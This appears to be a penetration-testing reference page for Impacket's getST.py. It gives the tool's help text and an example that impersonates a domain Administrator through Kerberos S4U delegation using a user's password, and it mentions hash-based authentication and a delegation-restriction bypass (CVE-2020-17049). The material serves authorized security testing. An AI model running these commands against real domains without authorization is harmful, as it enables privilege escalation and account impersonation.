---
title : "GetST.py"
# pre : ' '
description : "Given a password, hash or aesKey, it will request a Service Ticket and save it as ccache."
date : 2022-02-14T12:21:48+01:00
# hidden : true
# draft : true
weight : 40
# tags : ['']
---

---

Given a password, hash or aesKey, it will request a Service Ticket and save it as ccache.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
getST.py [-h] [-spn SPN] [-altservice ALTSERVICE] [-impersonate IMPERSONATE] [-additional-ticket ticket.ccache] [-ts] [-debug] [-u2u] [-self] [-force-forwardable] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                [-dc-ip ip address]
                identity
```

## Flags

```plain
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

positional arguments:
  identity              [domain/]username[:password]

options:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the service ticket will be generated for
  -altservice ALTSERVICE
                        New sname/SPN to set in the ticket
  -impersonate IMPERSONATE
                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
  -additional-ticket ticket.ccache
                        include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -u2u                  Request User-to-User ticket
  -self                 Only do S4U2self, no S4U2proxy
  -force-forwardable    Force the service ticket obtained through S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the specified -identity should be provided. This allows impresonation of protected
                        users and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If omitted it use the domain part (FQDN) specified in the target parameter

Examples: 
        ./getST.py -spn cifs/contoso-dc -hashes lm:nt contoso.com/user

        it will use the lm:nt hashes for authentication. If you don't specify them, a password will be asked
```

## Examples

[Using tickets](https://swarm.ptsecurity.com/kerberoasting-without-spns/).

To use tickets install the `klist` tool with `sudo apt install krb5-user`

```plain
$ getST.py -impersonate Administrator -spn 'host/SRV01.offsec.NL' offsec.NL/janedo:'Welkom1234'
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

## URL List

- [Github.com - getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
